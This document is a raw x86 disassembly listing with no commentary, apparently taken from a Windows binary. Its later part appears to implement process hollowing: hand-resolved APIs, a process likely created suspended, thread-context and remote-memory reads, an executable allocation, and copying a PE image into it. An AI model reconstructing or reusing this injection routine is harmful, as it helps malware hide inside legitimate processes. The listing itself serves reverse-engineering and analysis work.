  402dba:	89 f0                	mov    %esi,%eax
  402dbc:	83 c4 6c             	add    $0x6c,%esp
  402dbf:	5e                   	pop    %esi
  402dc0:	5f                   	pop    %edi
  402dc1:	5b                   	pop    %ebx
  402dc2:	5d                   	pop    %ebp
  402dc3:	c3                   	ret
  402dc4:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402dc7:	3d 01 00 00 00       	cmp    $0x1,%eax
  402dcc:	76 02                	jbe    0x402dd0
  402dce:	0f 0b                	ud2
  402dd0:	2d 01 00 00 00       	sub    $0x1,%eax
  402dd5:	ff 24 85 18 2e 40 00 	jmp    *0x402e18(,%eax,4)
  402ddc:	8b 75 a8             	mov    -0x58(%ebp),%esi
  402ddf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402de2:	83 f8 10             	cmp    $0x10,%eax
  402de5:	72 1f                	jb     0x402e06
  402de7:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402dea:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402ded:	40                   	inc    %eax
  402dee:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402df3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402df6:	72 06                	jb     0x402dfe
  402df8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402dfb:	8b 40 fc             	mov    -0x4(%eax),%eax
  402dfe:	89 04 24             	mov    %eax,(%esp)
  402e01:	e8 26 36 00 00       	call   0x40642c
  402e06:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402e0d:	89 34 24             	mov    %esi,(%esp)
  402e10:	e8 8b f1 01 00       	call   0x421fa0
  402e15:	83 ec 04             	sub    $0x4,%esp
  402e18:	dc 2d 40 00 55 89    	fsubrl 0x89550040
  402e1e:	e5 53                	in     $0x53,%eax
  402e20:	57                   	push   %edi
  402e21:	56                   	push   %esi
  402e22:	83 ec 6c             	sub    $0x6c,%esp
  402e25:	8a 1d 68 ee 4a 00    	mov    0x4aee68,%bl
  402e2b:	c7 45 b8 98 13 42 00 	movl   $0x421398,-0x48(%ebp)
  402e32:	c7 45 bc 24 36 42 00 	movl   $0x423624,-0x44(%ebp)
  402e39:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402e3c:	89 65 c8             	mov    %esp,-0x38(%ebp)
  402e3f:	c7 45 c0 f4 2e 40 00 	movl   $0x402ef4,-0x40(%ebp)
  402e46:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402e49:	89 f8                	mov    %edi,%eax
  402e4b:	e8 b1 f1 01 00       	call   0x422001
  402e50:	84 db                	test   %bl,%bl
  402e52:	75 78                	jne    0x402ecc
  402e54:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402e5b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402e62:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402e66:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402e6d:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402e70:	89 34 24             	mov    %esi,(%esp)
  402e73:	c7 44 24 04 5e 33 42 	movl   $0x42335e,0x4(%esp)
  402e7a:	00 
  402e7b:	e8 04 1e 00 00       	call   0x404c84
  402e80:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402e87:	89 74 24 04          	mov    %esi,0x4(%esp)
  402e8b:	c7 04 24 4c ee 4a 00 	movl   $0x4aee4c,(%esp)
  402e92:	e8 61 ee ff ff       	call   0x401cf8
  402e97:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402e9a:	83 f9 10             	cmp    $0x10,%ecx
  402e9d:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402ea0:	72 17                	jb     0x402eb9
  402ea2:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402ea5:	41                   	inc    %ecx
  402ea6:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402eac:	72 03                	jb     0x402eb1
  402eae:	8b 40 fc             	mov    -0x4(%eax),%eax
  402eb1:	89 04 24             	mov    %eax,(%esp)
  402eb4:	e8 73 35 00 00       	call   0x40642c
  402eb9:	c7 04 24 28 16 40 00 	movl   $0x401628,(%esp)
  402ec0:	e8 9b a6 01 00       	call   0x41d560
  402ec5:	c6 05 68 ee 4a 00 01 	movb   $0x1,0x4aee68
  402ecc:	83 3d 64 ee 4a 00 0f 	cmpl   $0xf,0x4aee64
  402ed3:	77 07                	ja     0x402edc
  402ed5:	be 50 ee 4a 00       	mov    $0x4aee50,%esi
  402eda:	eb 06                	jmp    0x402ee2
  402edc:	8b 35 50 ee 4a 00    	mov    0x4aee50,%esi
  402ee2:	89 3c 24             	mov    %edi,(%esp)
  402ee5:	e8 38 f1 01 00       	call   0x422022
  402eea:	89 f0                	mov    %esi,%eax
  402eec:	83 c4 6c             	add    $0x6c,%esp
  402eef:	5e                   	pop    %esi
  402ef0:	5f                   	pop    %edi
  402ef1:	5b                   	pop    %ebx
  402ef2:	5d                   	pop    %ebp
  402ef3:	c3                   	ret
  402ef4:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402ef7:	3d 01 00 00 00       	cmp    $0x1,%eax
  402efc:	76 02                	jbe    0x402f00
  402efe:	0f 0b                	ud2
  402f00:	2d 01 00 00 00       	sub    $0x1,%eax
  402f05:	ff 24 85 48 2f 40 00 	jmp    *0x402f48(,%eax,4)
  402f0c:	8b 75 a8             	mov    -0x58(%ebp),%esi
  402f0f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402f12:	83 f8 10             	cmp    $0x10,%eax
  402f15:	72 1f                	jb     0x402f36
  402f17:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402f1a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402f1d:	40                   	inc    %eax
  402f1e:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402f23:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402f26:	72 06                	jb     0x402f2e
  402f28:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402f2b:	8b 40 fc             	mov    -0x4(%eax),%eax
  402f2e:	89 04 24             	mov    %eax,(%esp)
  402f31:	e8 f6 34 00 00       	call   0x40642c
  402f36:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402f3d:	89 34 24             	mov    %esi,(%esp)
  402f40:	e8 5b f0 01 00       	call   0x421fa0
  402f45:	83 ec 04             	sub    $0x4,%esp
  402f48:	0c 2f                	or     $0x2f,%al
  402f4a:	40                   	inc    %eax
  402f4b:	00 55 89             	add    %dl,-0x77(%ebp)
  402f4e:	e5 53                	in     $0x53,%eax
  402f50:	57                   	push   %edi
  402f51:	56                   	push   %esi
  402f52:	83 ec 6c             	sub    $0x6c,%esp
  402f55:	8a 1d d4 ee 4a 00    	mov    0x4aeed4,%bl
  402f5b:	c7 45 b8 98 13 42 00 	movl   $0x421398,-0x48(%ebp)
  402f62:	c7 45 bc 34 36 42 00 	movl   $0x423634,-0x44(%ebp)
  402f69:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402f6c:	89 65 c8             	mov    %esp,-0x38(%ebp)
  402f6f:	c7 45 c0 24 30 40 00 	movl   $0x403024,-0x40(%ebp)
  402f76:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402f79:	89 f8                	mov    %edi,%eax
  402f7b:	e8 81 f0 01 00       	call   0x422001
  402f80:	84 db                	test   %bl,%bl
  402f82:	75 78                	jne    0x402ffc
  402f84:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402f8b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402f92:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402f96:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402f9d:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402fa0:	89 34 24             	mov    %esi,(%esp)
  402fa3:	c7 44 24 04 a5 34 42 	movl   $0x4234a5,0x4(%esp)
  402faa:	00 
  402fab:	e8 d4 1c 00 00       	call   0x404c84
  402fb0:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402fb7:	89 74 24 04          	mov    %esi,0x4(%esp)
  402fbb:	c7 04 24 b8 ee 4a 00 	movl   $0x4aeeb8,(%esp)
  402fc2:	e8 31 ed ff ff       	call   0x401cf8
  402fc7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402fca:	83 f9 10             	cmp    $0x10,%ecx
  402fcd:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402fd0:	72 17                	jb     0x402fe9
  402fd2:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402fd5:	41                   	inc    %ecx
  402fd6:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402fdc:	72 03                	jb     0x402fe1
  402fde:	8b 40 fc             	mov    -0x4(%eax),%eax
  402fe1:	89 04 24             	mov    %eax,(%esp)
  402fe4:	e8 43 34 00 00       	call   0x40642c
  402fe9:	c7 04 24 18 17 40 00 	movl   $0x401718,(%esp)
  402ff0:	e8 6b a5 01 00       	call   0x41d560
  402ff5:	c6 05 d4 ee 4a 00 01 	movb   $0x1,0x4aeed4
  402ffc:	83 3d d0 ee 4a 00 0f 	cmpl   $0xf,0x4aeed0
  403003:	77 07                	ja     0x40300c
  403005:	be bc ee 4a 00       	mov    $0x4aeebc,%esi
  40300a:	eb 06                	jmp    0x403012
  40300c:	8b 35 bc ee 4a 00    	mov    0x4aeebc,%esi
  403012:	89 3c 24             	mov    %edi,(%esp)
  403015:	e8 08 f0 01 00       	call   0x422022
  40301a:	89 f0                	mov    %esi,%eax
  40301c:	83 c4 6c             	add    $0x6c,%esp
  40301f:	5e                   	pop    %esi
  403020:	5f                   	pop    %edi
  403021:	5b                   	pop    %ebx
  403022:	5d                   	pop    %ebp
  403023:	c3                   	ret
  403024:	8b 45 a0             	mov    -0x60(%ebp),%eax
  403027:	3d 01 00 00 00       	cmp    $0x1,%eax
  40302c:	76 02                	jbe    0x403030
  40302e:	0f 0b                	ud2
  403030:	2d 01 00 00 00       	sub    $0x1,%eax
  403035:	ff 24 85 78 30 40 00 	jmp    *0x403078(,%eax,4)
  40303c:	8b 75 a8             	mov    -0x58(%ebp),%esi
  40303f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403042:	83 f8 10             	cmp    $0x10,%eax
  403045:	72 1f                	jb     0x403066
  403047:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40304a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40304d:	40                   	inc    %eax
  40304e:	3d 00 10 00 00       	cmp    $0x1000,%eax
  403053:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403056:	72 06                	jb     0x40305e
  403058:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40305b:	8b 40 fc             	mov    -0x4(%eax),%eax
  40305e:	89 04 24             	mov    %eax,(%esp)
  403061:	e8 c6 33 00 00       	call   0x40642c
  403066:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  40306d:	89 34 24             	mov    %esi,(%esp)
  403070:	e8 2b ef 01 00       	call   0x421fa0
  403075:	83 ec 04             	sub    $0x4,%esp
  403078:	3c 30                	cmp    $0x30,%al
  40307a:	40                   	inc    %eax
  40307b:	00 55 89             	add    %dl,-0x77(%ebp)
  40307e:	e5 53                	in     $0x53,%eax
  403080:	57                   	push   %edi
  403081:	56                   	push   %esi
  403082:	81 ec 9c 03 00 00    	sub    $0x39c,%esp
  403088:	8b 75 08             	mov    0x8(%ebp),%esi
  40308b:	c7 45 a4 98 13 42 00 	movl   $0x421398,-0x5c(%ebp)
  403092:	c7 45 a8 44 36 42 00 	movl   $0x423644,-0x58(%ebp)
  403099:	89 6d ac             	mov    %ebp,-0x54(%ebp)
  40309c:	89 65 b4             	mov    %esp,-0x4c(%ebp)
  40309f:	c7 45 ac b9 36 40 00 	movl   $0x4036b9,-0x54(%ebp)
  4030a6:	8d 45 88             	lea    -0x78(%ebp),%eax
  4030a9:	e8 53 ef 01 00       	call   0x422001
  4030ae:	85 f6                	test   %esi,%esi
  4030b0:	bf 01 00 00 00       	mov    $0x1,%edi
  4030b5:	0f 84 86 01 00 00    	je     0x403241
  4030bb:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4030be:	85 db                	test   %ebx,%ebx
  4030c0:	0f 84 7b 01 00 00    	je     0x403241
  4030c6:	80 3b 00             	cmpb   $0x0,(%ebx)
  4030c9:	0f 84 6d 01 00 00    	je     0x40323c
  4030cf:	8b 46 3c             	mov    0x3c(%esi),%eax
  4030d2:	bf 01 00 00 00       	mov    $0x1,%edi
  4030d7:	81 3c 30 50 45 00 00 	cmpl   $0x4550,(%eax,%esi,1)
  4030de:	0f 85 5d 01 00 00    	jne    0x403241
  4030e4:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4030e7:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  4030ee:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%ebp)
  4030f5:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%ebp)
  4030fc:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%ebp)
  403103:	8d bd 28 ff ff ff    	lea    -0xd8(%ebp),%edi
  403109:	31 c0                	xor    %eax,%eax
  40310b:	b9 11 00 00 00       	mov    $0x11,%ecx
  403110:	f3 ab                	rep stos %eax,%es:(%edi)
  403112:	8b 35 6c ee 4a 00    	mov    0x4aee6c,%esi
  403118:	c7 45 90 ff ff ff ff 	movl   $0xffffffff,-0x70(%ebp)
  40311f:	e8 c8 fb ff ff       	call   0x402cec
  403124:	89 f2                	mov    %esi,%edx
  403126:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403129:	8b 74 0a 78          	mov    0x78(%edx,%ecx,1),%esi
  40312d:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403132:	77 12                	ja     0x403146
  403134:	8b 7c 32 1c          	mov    0x1c(%edx,%esi,1),%edi
  403138:	01 d7                	add    %edx,%edi
  40313a:	0f b7 c8             	movzwl %ax,%ecx
  40313d:	2b 4c 32 10          	sub    0x10(%edx,%esi,1),%ecx
  403141:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  403144:	eb 77                	jmp    0x4031bd
  403146:	8b 5c 32 18          	mov    0x18(%edx,%esi,1),%ebx
  40314a:	89 75 e8             	mov    %esi,-0x18(%ebp)
  40314d:	8b 4c 32 20          	mov    0x20(%edx,%esi,1),%ecx
  403151:	01 d1                	add    %edx,%ecx
  403153:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  403156:	31 c9                	xor    %ecx,%ecx
  403158:	0f 1f 40 00          	nopl   0x0(%eax)
  40315c:	4b                   	dec    %ebx
  40315d:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  403160:	eb 11                	jmp    0x403173
  403162:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403169:	00 00 00 
  40316c:	43                   	inc    %ebx
  40316d:	89 d9                	mov    %ebx,%ecx
  40316f:	89 f2                	mov    %esi,%edx
  403171:	89 f8                	mov    %edi,%eax
  403173:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  403176:	8b 75 f0             	mov    -0x10(%ebp),%esi
  403179:	8d 1c 0e             	lea    (%esi,%ecx,1),%ebx
  40317c:	d1 eb                	shr    $1,%ebx
  40317e:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403181:	8b 0c 99             	mov    (%ecx,%ebx,4),%ecx
  403184:	89 d6                	mov    %edx,%esi
  403186:	01 d1                	add    %edx,%ecx
  403188:	83 ec 08             	sub    $0x8,%esp
  40318b:	89 c7                	mov    %eax,%edi
  40318d:	50                   	push   %eax
  40318e:	51                   	push   %ecx
  40318f:	e8 1c f1 00 00       	call   0x4122b0
  403194:	83 c4 10             	add    $0x10,%esp
  403197:	85 c0                	test   %eax,%eax
  403199:	78 d1                	js     0x40316c
  40319b:	89 f2                	mov    %esi,%edx
  40319d:	89 f8                	mov    %edi,%eax
  40319f:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4031a2:	75 b8                	jne    0x40315c
  4031a4:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4031a7:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  4031ab:	01 d0                	add    %edx,%eax
  4031ad:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  4031b1:	01 d1                	add    %edx,%ecx
  4031b3:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  4031b7:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4031ba:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4031bd:	03 10                	add    (%eax),%edx
  4031bf:	c7 45 90 ff ff ff ff 	movl   $0xffffffff,-0x70(%ebp)
  4031c6:	83 ec 08             	sub    $0x8,%esp
  4031c9:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4031cc:	50                   	push   %eax
  4031cd:	8d 85 28 ff ff ff    	lea    -0xd8(%ebp),%eax
  4031d3:	50                   	push   %eax
  4031d4:	6a 00                	push   $0x0
  4031d6:	6a 00                	push   $0x0
  4031d8:	6a 0c                	push   $0xc
  4031da:	6a 00                	push   $0x0
  4031dc:	6a 00                	push   $0x0
  4031de:	6a 00                	push   $0x0
  4031e0:	6a 00                	push   $0x0
  4031e2:	53                   	push   %ebx
  4031e3:	ff d2                	call   *%edx
  4031e5:	83 c4 08             	add    $0x8,%esp
  4031e8:	85 c0                	test   %eax,%eax
  4031ea:	74 50                	je     0x40323c
  4031ec:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4031ef:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4031f2:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4031f5:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4031f8:	c7 85 5c fc ff ff 07 	movl   $0x10007,-0x3a4(%ebp)
  4031ff:	00 01 00 
  403202:	a1 70 ee 4a 00       	mov    0x4aee70,%eax
  403207:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40320a:	c7 45 90 01 00 00 00 	movl   $0x1,-0x70(%ebp)
  403211:	e8 16 f6 ff ff       	call   0x40282c
  403216:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403219:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  40321c:	8b 74 0a 78          	mov    0x78(%edx,%ecx,1),%esi
  403220:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403225:	77 36                	ja     0x40325d
  403227:	8b 7c 32 1c          	mov    0x1c(%edx,%esi,1),%edi
  40322b:	01 d7                	add    %edx,%edi
  40322d:	0f b7 c8             	movzwl %ax,%ecx
  403230:	2b 4c 32 10          	sub    0x10(%edx,%esi,1),%ecx
  403234:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  403237:	e9 9e 00 00 00       	jmp    0x4032da
  40323c:	bf 01 00 00 00       	mov    $0x1,%edi
  403241:	83 ec 0c             	sub    $0xc,%esp
  403244:	8d 45 88             	lea    -0x78(%ebp),%eax
  403247:	50                   	push   %eax
  403248:	e8 d5 ed 01 00       	call   0x422022
  40324d:	83 c4 10             	add    $0x10,%esp
  403250:	89 f8                	mov    %edi,%eax
  403252:	81 c4 9c 03 00 00    	add    $0x39c,%esp
  403258:	5e                   	pop    %esi
  403259:	5f                   	pop    %edi
  40325a:	5b                   	pop    %ebx
  40325b:	5d                   	pop    %ebp
  40325c:	c3                   	ret
  40325d:	8b 5c 32 18          	mov    0x18(%edx,%esi,1),%ebx
  403261:	89 75 e8             	mov    %esi,-0x18(%ebp)
  403264:	8b 4c 32 20          	mov    0x20(%edx,%esi,1),%ecx
  403268:	01 d1                	add    %edx,%ecx
  40326a:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40326d:	31 c9                	xor    %ecx,%ecx
  40326f:	66 66 66 66 2e 0f 1f 	data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  403276:	84 00 00 00 00 00 
  40327c:	4b                   	dec    %ebx
  40327d:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  403280:	eb 11                	jmp    0x403293
  403282:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403289:	00 00 00 
  40328c:	43                   	inc    %ebx
  40328d:	89 d9                	mov    %ebx,%ecx
  40328f:	89 fa                	mov    %edi,%edx
  403291:	89 f0                	mov    %esi,%eax
  403293:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  403296:	8b 75 f0             	mov    -0x10(%ebp),%esi
  403299:	8d 1c 0e             	lea    (%esi,%ecx,1),%ebx
  40329c:	d1 eb                	shr    $1,%ebx
  40329e:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4032a1:	8b 0c 99             	mov    (%ecx,%ebx,4),%ecx
  4032a4:	89 d7                	mov    %edx,%edi
  4032a6:	01 d1                	add    %edx,%ecx
  4032a8:	83 ec 08             	sub    $0x8,%esp
  4032ab:	89 c6                	mov    %eax,%esi
  4032ad:	50                   	push   %eax
  4032ae:	51                   	push   %ecx
  4032af:	e8 fc ef 00 00       	call   0x4122b0
  4032b4:	83 c4 10             	add    $0x10,%esp
  4032b7:	85 c0                	test   %eax,%eax
  4032b9:	78 d1                	js     0x40328c
  4032bb:	89 fa                	mov    %edi,%edx
  4032bd:	89 f0                	mov    %esi,%eax
  4032bf:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4032c2:	75 b8                	jne    0x40327c
  4032c4:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4032c7:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  4032cb:	01 d0                	add    %edx,%eax
  4032cd:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  4032d1:	01 d1                	add    %edx,%ecx
  4032d3:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  4032d7:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4032da:	03 10                	add    (%eax),%edx
  4032dc:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4032df:	c7 45 90 02 00 00 00 	movl   $0x2,-0x70(%ebp)
  4032e6:	83 ec 08             	sub    $0x8,%esp
  4032e9:	8d 8d 5c fc ff ff    	lea    -0x3a4(%ebp),%ecx
  4032ef:	51                   	push   %ecx
  4032f0:	50                   	push   %eax
  4032f1:	ff d2                	call   *%edx
  4032f3:	83 c4 08             	add    $0x8,%esp
  4032f6:	85 c0                	test   %eax,%eax
  4032f8:	0f 88 68 04 00 00    	js     0x403766
  4032fe:	c7 85 78 ff ff ff 00 	movl   $0x0,-0x88(%ebp)
  403305:	00 00 00 
  403308:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40330b:	89 45 84             	mov    %eax,-0x7c(%ebp)
  40330e:	8b 85 00 fd ff ff    	mov    -0x300(%ebp),%eax
  403314:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403317:	a1 70 ee 4a 00       	mov    0x4aee70,%eax
  40331c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40331f:	c7 45 90 03 00 00 00 	movl   $0x3,-0x70(%ebp)
  403326:	e8 61 f7 ff ff       	call   0x402a8c
  40332b:	8b 75 e8             	mov    -0x18(%ebp),%esi
  40332e:	83 c6 08             	add    $0x8,%esi
  403331:	8b 55 ec             	mov    -0x14(%ebp),%edx
  403334:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403337:	8b 4c 0a 78          	mov    0x78(%edx,%ecx,1),%ecx
  40333b:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403340:	89 f7                	mov    %esi,%edi
  403342:	77 1a                	ja     0x40335e
  403344:	8b 74 0a 1c          	mov    0x1c(%edx,%ecx,1),%esi
  403348:	01 d6                	add    %edx,%esi
  40334a:	89 cb                	mov    %ecx,%ebx
  40334c:	0f b7 c8             	movzwl %ax,%ecx
  40334f:	2b 4c 1a 10          	sub    0x10(%edx,%ebx,1),%ecx
  403353:	8d 04 8e             	lea    (%esi,%ecx,4),%eax
  403356:	8b 75 84             	mov    -0x7c(%ebp),%esi
  403359:	e9 7d 00 00 00       	jmp    0x4033db
  40335e:	89 7d e8             	mov    %edi,-0x18(%ebp)
  403361:	8b 5c 0a 18          	mov    0x18(%edx,%ecx,1),%ebx
  403365:	89 8d 7c ff ff ff    	mov    %ecx,-0x84(%ebp)
  40336b:	8b 4c 0a 20          	mov    0x20(%edx,%ecx,1),%ecx
  40336f:	01 d1                	add    %edx,%ecx
  403371:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  403374:	31 f6                	xor    %esi,%esi
  403376:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  40337c:	4b                   	dec    %ebx
  40337d:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  403380:	eb 0f                	jmp    0x403391
  403382:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403389:	00 00 00 
  40338c:	43                   	inc    %ebx
  40338d:	89 de                	mov    %ebx,%esi
  40338f:	89 f8                	mov    %edi,%eax
  403391:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403394:	8d 1c 31             	lea    (%ecx,%esi,1),%ebx
  403397:	d1 eb                	shr    $1,%ebx
  403399:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40339c:	8b 0c 99             	mov    (%ecx,%ebx,4),%ecx
  40339f:	03 4d ec             	add    -0x14(%ebp),%ecx
  4033a2:	83 ec 08             	sub    $0x8,%esp
  4033a5:	89 c7                	mov    %eax,%edi
  4033a7:	50                   	push   %eax
  4033a8:	51                   	push   %ecx
  4033a9:	e8 02 ef 00 00       	call   0x4122b0
  4033ae:	83 c4 10             	add    $0x10,%esp
  4033b1:	85 c0                	test   %eax,%eax
  4033b3:	78 d7                	js     0x40338c
  4033b5:	89 f8                	mov    %edi,%eax
  4033b7:	75 c3                	jne    0x40337c
  4033b9:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4033bc:	8b 8d 7c ff ff ff    	mov    -0x84(%ebp),%ecx
  4033c2:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  4033c6:	01 d0                	add    %edx,%eax
  4033c8:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  4033cc:	01 d1                	add    %edx,%ecx
  4033ce:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  4033d2:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4033d5:	8b 75 84             	mov    -0x7c(%ebp),%esi
  4033d8:	8b 7d e8             	mov    -0x18(%ebp),%edi
  4033db:	03 10                	add    (%eax),%edx
  4033dd:	c7 45 90 04 00 00 00 	movl   $0x4,-0x70(%ebp)
  4033e4:	83 ec 0c             	sub    $0xc,%esp
  4033e7:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4033ea:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  4033f0:	51                   	push   %ecx
  4033f1:	6a 04                	push   $0x4
  4033f3:	50                   	push   %eax
  4033f4:	57                   	push   %edi
  4033f5:	56                   	push   %esi
  4033f6:	ff d2                	call   *%edx
  4033f8:	83 c4 0c             	add    $0xc,%esp
  4033fb:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4033fe:	03 4d 08             	add    0x8(%ebp),%ecx
  403401:	8b 45 c0             	mov    -0x40(%ebp),%eax
  403404:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  403407:	8b 49 50             	mov    0x50(%ecx),%ecx
  40340a:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  403411:	89 8d 74 ff ff ff    	mov    %ecx,-0x8c(%ebp)
  403417:	c7 45 90 05 00 00 00 	movl   $0x5,-0x70(%ebp)
  40341e:	83 ec 08             	sub    $0x8,%esp
  403421:	8d 8d 74 ff ff ff    	lea    -0x8c(%ebp),%ecx
  403427:	6a 40                	push   $0x40
  403429:	68 00 30 00 00       	push   $0x3000
  40342e:	51                   	push   %ecx
  40342f:	6a 00                	push   $0x0
  403431:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403434:	51                   	push   %ecx
  403435:	50                   	push   %eax
  403436:	e8 e5 0a 00 00       	call   0x403f20
  40343b:	83 c4 20             	add    $0x20,%esp
  40343e:	85 c0                	test   %eax,%eax
  403440:	0f 88 19 03 00 00    	js     0x40375f
  403446:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403449:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40344c:	85 c0                	test   %eax,%eax
  40344e:	0f 84 12 03 00 00    	je     0x403766
  403454:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  403457:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40345a:	8b 52 54             	mov    0x54(%edx),%edx
  40345d:	c7 45 90 07 00 00 00 	movl   $0x7,-0x70(%ebp)
  403464:	83 ec 0c             	sub    $0xc,%esp
  403467:	6a 00                	push   $0x0
  403469:	52                   	push   %edx
  40346a:	ff 75 08             	push   0x8(%ebp)
  40346d:	50                   	push   %eax
  40346e:	51                   	push   %ecx
  40346f:	e8 ac 03 00 00       	call   0x403820
  403474:	83 c4 20             	add    $0x20,%esp
  403477:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40347a:	66 83 7a 06 00       	cmpw   $0x0,0x6(%edx)
  40347f:	8b 45 c0             	mov    -0x40(%ebp),%eax
  403482:	74 5c                	je     0x4034e0
  403484:	0f b7 4a 14          	movzwl 0x14(%edx),%ecx
  403488:	8d 74 0a 2c          	lea    0x2c(%edx,%ecx,1),%esi
  40348c:	31 d2                	xor    %edx,%edx
